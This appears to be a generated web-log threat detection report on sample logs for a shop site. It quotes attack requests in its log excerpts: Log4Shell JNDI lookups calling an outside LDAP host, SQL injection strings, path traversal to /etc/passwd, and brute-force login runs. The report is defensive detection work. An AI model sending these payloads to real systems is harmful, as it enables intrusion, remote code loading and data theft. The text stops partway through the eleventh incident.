# WATCHTOWER Threat Detection Report

Generated: 2026-11-26 16:19:10 UTC

## Scan summary

- Files: examples/hard\_access.log
- Time range: 2026-11-01T00:00:00+00:00 to 2026-11-01T05:59:30+00:00
- Lines read: 3442
- Lines parsed: 3442
- Lines malformed: 0
- Unique clients: 296
- Alerts: 31

## Incidents by severity

| Severity | Incidents |
|---|---|
| critical | 7 |
| high | 3 |
| medium | 7 |
| low | 0 |

## Incidents

### 1. 203.0.113.26 (critical, score 100)

- Client: 203.0.113.26
- Score: 100/100
- Severity: critical
- Stages: credential-access
- Window: 2026-11-01 00:23:46 UTC to 2026-11-01 00:31:16 UTC
- Summary: 203.0.113.26 brute-forced a login \(60 failed attempts\); the brute force ended in a successful login.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | high | [T1110](https://attack.mitre.org/techniques/T1110/) | 60 | 2026-11-01 00:23:46 UTC | 2026-11-01 00:31:10 UTC |
| BEH-BRUTE-SUCCESS | critical | [T1110](https://attack.mitre.org/techniques/T1110/) | 61 | 2026-11-01 00:26:17 UTC | 2026-11-01 00:31:16 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s \(threshold 10\); 10 explicit 401/403 failures.)

```text
203.0.113.26 - - [01/Nov/2026:00:24:23 +0000] "POST /members/sign-in HTTP/1.1" 401 333 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:24:32 +0000] "POST /members/sign-in HTTP/1.1" 401 339 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:24:41 +0000] "POST /members/sign-in HTTP/1.1" 401 333 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:24:48 +0000] "POST /members/sign-in HTTP/1.1" 401 316 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:24:57 +0000] "POST /members/sign-in HTTP/1.1" 401 310 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

**BEH-BRUTE-SUCCESS**: Successful login after brute force (Login succeeded \(HTTP 302\) after 60 failed attempts \(401/403\); credentials may be compromised.)

```text
203.0.113.26 - - [01/Nov/2026:00:30:49 +0000] "POST /members/sign-in HTTP/1.1" 401 318 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:30:57 +0000] "POST /members/sign-in HTTP/1.1" 401 317 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:31:04 +0000] "POST /members/sign-in HTTP/1.1" 401 340 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:31:10 +0000] "POST /members/sign-in HTTP/1.1" 401 334 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.26 - - [01/Nov/2026:00:31:16 +0000] "POST /members/sign-in HTTP/1.1" 302 0 "https://shop.example.com/members/sign-in" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.26 at the WAF or firewall.
- Brute force succeeded: reset the affected account's credentials, revoke active sessions and review what the session did after login.

### 2. 203.0.113.23 (critical, score 100)

- Client: 203.0.113.23
- Score: 100/100
- Severity: critical
- Stages: credential-access
- Window: 2026-11-01 00:26:56 UTC to 2026-11-01 00:47:11 UTC
- Summary: 203.0.113.23 brute-forced a login \(40 failed attempts\); the brute force ended in a successful login.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | high | [T1110](https://attack.mitre.org/techniques/T1110/) | 40 | 2026-11-01 00:26:56 UTC | 2026-11-01 00:46:39 UTC |
| BEH-BRUTE-SUCCESS | critical | [T1110](https://attack.mitre.org/techniques/T1110/) | 41 | 2026-11-01 00:42:36 UTC | 2026-11-01 00:47:11 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s \(threshold 10\); 10 explicit 401/403 failures.)

```text
203.0.113.23 - - [01/Nov/2026:00:29:30 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:30:01 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:30:29 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:31:00 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:31:28 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

**BEH-BRUTE-SUCCESS**: Successful login after brute force (Login succeeded \(HTTP 302\) after 40 failed attempts \(401/403\); credentials may be compromised.)

```text
203.0.113.23 - - [01/Nov/2026:00:45:08 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:45:38 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:46:10 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:46:39 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:47:11 +0000] "POST /login HTTP/1.1" 302 0 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.23 at the WAF or firewall.
- Brute force succeeded: reset the affected account's credentials, revoke active sessions and review what the session did after login.

### 3. 203.0.113.15 (critical, score 100)

- Client: 203.0.113.15
- Score: 100/100
- Severity: critical
- Stages: exploit
- Window: 2026-11-01 02:02:12 UTC to 2026-11-01 02:02:19 UTC
- Summary: 203.0.113.15 sent a Log4Shell \(JNDI lookup\) payload; one attempt returned 2xx.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-LOG4SHELL | critical | [T1190](https://attack.mitre.org/techniques/T1190/) | 3 | 2026-11-01 02:02:12 UTC | 2026-11-01 02:02:19 UTC |

**SIG-LOG4SHELL**: Log4Shell JNDI injection \(CVE-2021-44228\) (3 matching request\(s\); patterns: jndi-lookup. 1 request\(s\) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical. answered 2xx, but / answers 2xx to ordinary requests \(204 baseline, size ~12682 bytes\), so not treated as success.)

```text
203.0.113.15 - - [01/Nov/2026:02:02:12 +0000] "GET / HTTP/1.1" 200 14531 "-" "${jndi:ldap://203.0.113.99/a}"
203.0.113.15 - - [01/Nov/2026:02:02:15 +0000] "GET /login HTTP/1.1" 200 262 "${jndi:ldap://203.0.113.99/b}" "${jndi:ldap://203.0.113.99/a}"
203.0.113.15 - - [01/Nov/2026:02:02:19 +0000] "GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.99%2Fc%7D HTTP/1.1" 200 10117 "-" "curl/8.5.0"
```

Recommended actions:

- Block or rate-limit 203.0.113.15 at the WAF or firewall.
- An exploit attempt got a 2xx answer: investigate the targeted endpoint for compromise and patch or disable it.

### 4. 203.0.113.14 (critical, score 100)

- Client: 203.0.113.14
- Score: 100/100
- Severity: critical
- Stages: recon, exploit
- Window: 2026-11-01 02:55:51 UTC to 2026-11-01 02:57:55 UTC
- Summary: 203.0.113.14 ran a sqlmap scan, then attempted SQL injection; 12 attempts returned 200.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-UA-SCANNER | medium | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | 40 | 2026-11-01 02:55:51 UTC | 2026-11-01 02:57:55 UTC |
| SIG-SQLI | critical | [T1190](https://attack.mitre.org/techniques/T1190/) | 40 | 2026-11-01 02:55:51 UTC | 2026-11-01 02:57:55 UTC |

**SIG-UA-SCANNER**: Known scanner user agent (40 matching request\(s\); patterns: scanner-ua.)

```text
203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] "GET /products?id=1'+OR+'1'='1 HTTP/1.1" 500 225 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] "GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1" 200 6006 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] "GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1" 200 716 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] "GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1" 200 14618 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] "GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1" 500 382 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
```

**SIG-SQLI**: SQL injection pattern (40 matching request\(s\); patterns: tautology, quote-or-cmp, union-select, select-fn, quote-comment, time-based, numeric-compare, sql-variable. 12 request\(s\) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical.)

```text
203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] "GET /products?id=1'+OR+'1'='1 HTTP/1.1" 500 225 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] "GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1" 200 6006 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] "GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1" 200 716 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] "GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1" 200 14618 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] "GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1" 500 382 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
```

Recommended actions:

- Block or rate-limit 203.0.113.14 at the WAF or firewall.
- An exploit attempt got a 2xx answer: investigate the targeted endpoint for compromise and patch or disable it.
- Make sure sensitive files and paths probed during recon are not exposed.

### 5. 203.0.113.13 (critical, score 100)

- Client: 203.0.113.13
- Score: 100/100
- Severity: critical
- Stages: credential-access
- Window: 2026-11-01 03:35:51 UTC to 2026-11-01 03:39:41 UTC
- Summary: 203.0.113.13 brute-forced a login \(40 failed attempts\); the brute force ended in a successful login.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | high | [T1110](https://attack.mitre.org/techniques/T1110/) | 40 | 2026-11-01 03:35:51 UTC | 2026-11-01 03:39:34 UTC |
| BEH-BRUTE-SUCCESS | critical | [T1110](https://attack.mitre.org/techniques/T1110/) | 41 | 2026-11-01 03:35:51 UTC | 2026-11-01 03:39:41 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s \(threshold 10\); 10 explicit 401/403 failures.)

```text
203.0.113.13 - - [01/Nov/2026:03:36:22 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:26 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:34 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:40 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:48 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

**BEH-BRUTE-SUCCESS**: Successful login after brute force (Login succeeded \(HTTP 302\) after 40 failed attempts \(401/403\); credentials may be compromised.)

```text
203.0.113.13 - - [01/Nov/2026:03:39:17 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:24 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:31 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:34 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:41 +0000] "POST /login HTTP/1.1" 302 0 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

Recommended actions:

- Block or rate-limit 203.0.113.13 at the WAF or firewall.
- Brute force succeeded: reset the affected account's credentials, revoke active sessions and review what the session did after login.

### 6. 203.0.113.24 (critical, score 85)

- Client: 203.0.113.24
- Score: 85/100
- Severity: critical
- Stages: exploit
- Window: 2026-11-01 04:38:13 UTC to 2026-11-01 04:40:22 UTC
- Summary: 203.0.113.24 attempted SQL injection; five attempts returned 200.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-SQLI | critical | [T1190](https://attack.mitre.org/techniques/T1190/) | 5 | 2026-11-01 04:38:13 UTC | 2026-11-01 04:40:22 UTC |

**SIG-SQLI**: SQL injection pattern (5 matching request\(s\); patterns: sql-variable, order-by, numeric-compare, tautology, quote-or-cmp. 5 request\(s\) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical.)

```text
203.0.113.24 - - [01/Nov/2026:04:38:13 +0000] "GET /products?id=1%20AND%201=CONVERT(int,@@version) HTTP/1.1" 200 14305 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:38:50 +0000] "GET /products?sort=name%20ORDER%20BY%2010-- HTTP/1.1" 200 20624 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:39:28 +0000] "GET /products?id=1+AND+1=2-- HTTP/1.1" 200 23299 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:39:54 +0000] "GET /products?id=1%20AND%201=1 HTTP/1.1" 200 5043 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:40:22 +0000] "GET /products?id=1%27%20AND%20%271%27=%272 HTTP/1.1" 200 8206 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.24 at the WAF or firewall.
- An exploit attempt got a 2xx answer: investigate the targeted endpoint for compromise and patch or disable it.

### 7. 203.0.113.27 (critical, score 80)

- Client: 203.0.113.27
- Score: 80/100
- Severity: critical
- Stages: credential-access
- Window: 2026-11-01 00:52:22 UTC to 2026-11-01 00:58:20 UTC
- Summary: 203.0.113.27 brute-forced a login \(81 login attempts\); the brute force ended in a successful login.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | medium | [T1110](https://attack.mitre.org/techniques/T1110/) | 81 | 2026-11-01 00:52:22 UTC | 2026-11-01 00:58:20 UTC |
| BEH-BRUTE-SUCCESS | high | [T1110](https://attack.mitre.org/techniques/T1110/) | 68 | 2026-11-01 00:53:20 UTC | 2026-11-01 00:58:20 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s \(threshold 10\); 0 explicit 401/403 failures; status-agnostic; lower confidence; user agent rotated across 6 values.)

```text
203.0.113.27 - - [01/Nov/2026:00:52:45 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0 Build/5"
203.0.113.27 - - [01/Nov/2026:00:52:51 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0"
203.0.113.27 - - [01/Nov/2026:00:52:54 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 Build/1"
203.0.113.27 - - [01/Nov/2026:00:52:58 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0 Build/2"
203.0.113.27 - - [01/Nov/2026:00:53:02 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1 Build/3"
```

**BEH-BRUTE-SUCCESS**: Successful login after brute force (response size changed from ~37 to 412 bytes after 67 uniform answers; likely success.)

```text
203.0.113.27 - - [01/Nov/2026:00:58:01 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 Build/4"
203.0.113.27 - - [01/Nov/2026:00:58:06 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0 Build/5"
203.0.113.27 - - [01/Nov/2026:00:58:11 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0"
203.0.113.27 - - [01/Nov/2026:00:58:15 +0000] "POST /oauth2/token HTTP/1.1" 200 37 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 Build/1"
203.0.113.27 - - [01/Nov/2026:00:58:20 +0000] "POST /oauth2/token HTTP/1.1" 200 412 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Build/0"
```

Recommended actions:

- Block or rate-limit 203.0.113.27 at the WAF or firewall.
- Brute force succeeded: reset the affected account's credentials, revoke active sessions and review what the session did after login.

### 8. 198.51.100.251 (high, score 65)

- Client: 198.51.100.251
- Score: 65/100
- Severity: high
- Stages: exploit
- Window: 2026-11-01 01:59:53 UTC to 2026-11-01 02:02:47 UTC
- Summary: 198.51.100.251 attempted cross-site scripting, then attempted SQL injection.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-XSS | medium | [T1190](https://attack.mitre.org/techniques/T1190/) | 1 | 2026-11-01 01:59:53 UTC | 2026-11-01 01:59:53 UTC |
| SIG-SQLI | high | [T1190](https://attack.mitre.org/techniques/T1190/) | 2 | 2026-11-01 02:01:10 UTC | 2026-11-01 02:02:47 UTC |

**SIG-XSS**: Script injection \(XSS\) pattern (1 matching request\(s\); patterns: script-tag. answered 2xx, but /docs/search answers 2xx to ordinary requests \(18 baseline, size ~4465 bytes\), so not treated as success.)

```text
198.51.100.251 - - [01/Nov/2026:01:59:53 +0000] "GET /docs/search?q=%3Cscript+src%3D%22app.js%22%3E HTTP/1.1" 200 3061 "https://shop.example.com/docs/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
```

**SIG-SQLI**: SQL injection pattern (2 matching request\(s\); patterns: tautology, numeric-compare, quote-or-cmp, union-select. answered 2xx, but /docs/search answers 2xx to ordinary requests \(18 baseline, size ~4465 bytes\), so not treated as success.)

```text
198.51.100.251 - - [01/Nov/2026:02:01:10 +0000] "GET /docs/search?q=%27+OR+1%3D1+explained HTTP/1.1" 200 3669 "https://shop.example.com/docs/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.251 - - [01/Nov/2026:02:02:47 +0000] "GET /docs/search?q=UNION+SELECT+explained HTTP/1.1" 200 5614 "https://shop.example.com/docs/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
```

Recommended actions:

- Block or rate-limit 198.51.100.251 at the WAF or firewall.
- An exploit attempt got a 2xx answer: investigate the targeted endpoint for compromise and patch or disable it.

### 9. 203.0.113.16 (high, score 60)

- Client: 203.0.113.16
- Score: 60/100
- Severity: high
- Stages: exploit
- Window: 2026-11-01 01:45:20 UTC to 2026-11-01 01:45:58 UTC
- Summary: 203.0.113.16 attempted path traversal.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-TRAVERSAL | high | [T1190](https://attack.mitre.org/techniques/T1190/) | 7 | 2026-11-01 01:45:20 UTC | 2026-11-01 01:45:58 UTC |

**SIG-TRAVERSAL**: Path traversal pattern (7 matching request\(s\); patterns: repeated-dotdot, dotdot-target, etc-passwd, nested-dotdot, win-ini.)

```text
203.0.113.16 - - [01/Nov/2026:01:45:20 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 400 432 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:30 +0000] "GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 404 438 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:34 +0000] "GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 404 547 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:38 +0000] "GET /download?file=....//....//....//etc/passwd HTTP/1.1" 403 494 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:41 +0000] "GET /view?page=..\..\..\windows\win.ini HTTP/1.1" 404 372 "-" "python-requests/2.31.0"
```

Recommended actions:

- Block or rate-limit 203.0.113.16 at the WAF or firewall.
- Confirm the targeted endpoints reject the exploit payloads and are patched.

### 10. 203.0.113.25 (high, score 60)

- Client: 203.0.113.25
- Score: 60/100
- Severity: high
- Stages: exploit
- Window: 2026-11-01 04:44:35 UTC to 2026-11-01 04:45:45 UTC
- Summary: 203.0.113.25 attempted path traversal.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-TRAVERSAL | high | [T1190](https://attack.mitre.org/techniques/T1190/) | 4 | 2026-11-01 04:44:35 UTC | 2026-11-01 04:45:45 UTC |

**SIG-TRAVERSAL**: Path traversal pattern (4 matching request\(s\); patterns: repeated-dotdot, dotdot-target, etc-passwd.)

```text
203.0.113.25 - - [01/Nov/2026:04:44:35 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 404 234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.25 - - [01/Nov/2026:04:45:05 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 403 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.25 - - [01/Nov/2026:04:45:33 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 403 578 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.25 - - [01/Nov/2026:04:45:45 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 404 510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.25 at the WAF or firewall.
- Confirm the targeted endpoints reject the exploit payloads and are patched.

### 11. 203.0.113.11 (medium, score 45)

- Client: 203.0.113.11
- Score: 45/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 02:39:35 UTC to 2026-11-01 02:48:19 UTC
- Summary: 203.0.113.11 ran a nikto scan, probed for sensitive files, then probed many missing paths over nine minutes \(40 misses across 40 paths\).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-UA-SCANNER | medium | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | 84 | 2026-11-01 02:39:35 UTC | 2026-11-01 02:48:19 UTC |
| SIG-SENSITIVE-PATH | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 12 | 2026-11-01 02:39:35 UTC | 2026-11-01 02:40:10 UTC |
| BEH-LOW-AND-SLOW | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 84 | 2026-11-01 02:39:35 UTC | 2026-11-01 02:48:19 UTC |

